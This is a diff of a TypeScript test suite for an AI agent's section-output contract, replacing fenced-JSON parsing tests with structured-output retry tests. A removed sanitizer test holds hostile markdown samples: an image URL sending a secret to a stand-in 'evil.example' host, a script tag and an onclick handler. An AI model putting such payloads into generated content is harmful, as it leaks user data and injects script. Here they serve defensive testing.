@@ -4,12 +4,10 @@ import {
   buildSectionOutputSchema,
   DEFAULT_EDITORIAL_GUIDANCE,
   ENHANCEMENT_SAFETY_PREAMBLE,
-  extractLastFencedJson,
   MAX_HEADING_CHARACTERS,
   MAX_MARKDOWN_CHARACTERS,
   MAX_SECTIONS,
   MAX_TOTAL_SECTION_CHARACTERS,
-  parseSectionOutput,
   queryForSections,
   validateSectionOutput,
   type AgentClient,
@@ -19,77 +17,27 @@ import {
 
 const valid = [{ heading: "Summary", markdown: "Done" }];
 
-describe("fenced JSON section contract", () => {
-  test("extracts a fenced json block surrounded by prose", () => {
-    expect(parseSectionOutput(`before\n\`\`\`json\n${JSON.stringify(valid)}\n\`\`\`\nafter`)).toEqual({ ok: true, sections: valid });
-  });
-
-  test("uses the last fenced json block when several are present", () => {
-    const first = JSON.stringify([{ heading: "Old", markdown: "ignore" }]);
-    const last = JSON.stringify(valid);
-    const message = `\`\`\`json\n${first}\n\`\`\`\ntext\n\`\`\`json\n${last}\n\`\`\``;
-    expect(extractLastFencedJson(message)?.trim()).toBe(last);
-    expect(parseSectionOutput(message)).toEqual({ ok: true, sections: valid });
-  });
-
-  test("rejects output with no fenced json block", () => {
-    expect(parseSectionOutput(JSON.stringify(valid))).toMatchObject({ ok: false, error: expect.stringContaining("No fenced") });
-  });
-
-  test("rejects malformed fenced json", () => {
-    expect(parseSectionOutput("```json\n[{ nope }]\n```")).toMatchObject({ ok: false, error: expect.stringContaining("Malformed JSON") });
-  });
-
-  test("accepts markdown code fences and raw newlines inside a JSON string", () => {
-    expect(parseSectionOutput('```json\n[{"heading":"API","markdown":"```ts\nfoo()\n```\ndone"}]\n```')).toEqual({
-      ok: true,
-      sections: [{ heading: "API", markdown: "```ts\nfoo()\n```\ndone" }],
-    });
-  });
-
-  test("trims edge newlines before writer validation", () => {
-    expect(parseSectionOutput('```json\n[{"heading":"Summary","markdown":"\\n- item\\n"}]\n```')).toEqual({
-      ok: true,
-      sections: [{ heading: "Summary", markdown: "- item" }],
-    });
-  });
-
-  test("neutralizes external images and dangerous raw HTML", () => {
-    const markdown = '![](https://evil.example/?d=secret)\n<img src="https://evil.example/x">\n<script>alert(1)</script>\n<div onclick="steal()">x</div>';
-    const result = parseSectionOutput(`\`\`\`json\n${JSON.stringify([{ heading: "Summary", markdown }])}\n\`\`\``);
-    expect(result.ok).toBe(true);
-    if (result.ok) {
-      expect(result.sections[0]!.markdown).toContain("`![](https://evil.example/?d=secret)`");
-      expect(result.sections[0]!.markdown).not.toContain("<img");
-      expect(result.sections[0]!.markdown).not.toContain("<script");
-      expect(result.sections[0]!.markdown).not.toContain("<div onclick=");
-      expect(result.sections[0]!.markdown).toContain("&lt;img");
-    }
-  });
-
-  test("rejects schema violations including empty arrays and headings", () => {
-    expect(parseSectionOutput("```json\n[]\n```").ok).toBe(false);
-    expect(parseSectionOutput('```json\n[{"heading":" ","markdown":3}]\n```').ok).toBe(false);
-  });
-
+describe("the two-attempt contract loop over structured output", () => {
   test("retries once then skips and preserves the last good sections", async () => {
+    const rejected = envelope([{ heading: "Summary", markdown: AI_BLOCK_END }]);
     const agent = new SequenceAgent([
-      { finalAssistantMessage: "not json", sessionId: "session-a" },
-      { finalAssistantMessage: "still not json", sessionId: "session-b" },
+      { structuredOutput: rejected, sessionId: "session-a" },
+      { structuredOutput: rejected, sessionId: "session-b" },
     ]);
     const lastGood: readonly Section[] = [{ heading: "Existing", markdown: "Keep me" }];
     const errors: string[] = [];
     const result = await queryForSections(agent, request(), lastGood, { error: (message) => errors.push(String(message)) });
     expect(agent.requests).toHaveLength(2);
     expect(agent.requests[1]?.prompt).toContain("Validation error");
+    expect(agent.requests[1]?.prompt).toContain("ownership marker");
     expect(result).toEqual(expect.objectContaining({ status: "skipped", sections: lastGood, attempts: 2 }));
     expect(errors[0]).toContain("OUTPUT REJECTED AFTER TWO ATTEMPTS");
   });
 
   test("a same-pass retry resumes the first attempt's session id", async () => {
     const agent = new SequenceAgent([
-      { finalAssistantMessage: "not json", sessionId: "session-first-attempt" },
-      { finalAssistantMessage: '```json\n' + JSON.stringify(valid) + '\n```', sessionId: "session-second-attempt" },
+      { structuredOutput: envelope([]), sessionId: "session-first-attempt" },
+      { structuredOutput: envelope(valid), sessionId: "session-second-attempt" },
     ]);
     const result = await queryForSections(agent, request(), [], { error: () => {} });
     expect(agent.requests).toHaveLength(2);
@@ -98,9 +46,15 @@ describe("fenced JSON section contract", () => {
     expect(result).toEqual(expect.objectContaining({ status: "valid", sessionId: "session-second-attempt" }));
   });
 
-  test("rejects marker tokens in model output", () => {
-    const message = `\`\`\`json\n${JSON.stringify([{ heading: "Summary", markdown: AI_BLOCK_END }])}\n\`\`\``;
-    expect(parseSectionOutput(message)).toMatchObject({ ok: false, error: expect.stringContaining("ownership marker") });
+  test("absent structured output is corrected on a second attempt, not treated as a query error", async () => {
+    const agent = new SequenceAgent([
+      { structuredOutput: undefined, sessionId: "session-exhausted" },
+      { structuredOutput: envelope(valid), sessionId: "session-recovered" },
+    ]);
+    const result = await queryForSections(agent, request(), [], { error: () => {} });
+    expect(agent.requests).toHaveLength(2);
+    expect(agent.requests[1]?.prompt).toContain("no structured output");
+    expect(result).toEqual(expect.objectContaining({ status: "valid", attempts: 2 }));
   });
 });
 
@@ -128,6 +82,7 @@ function request(): AgentQueryRequest {
     tools: [],
     settingSources: [],
     maxTurns: 2,
+    outputSchema: buildSectionOutputSchema(),
   };
 }
 
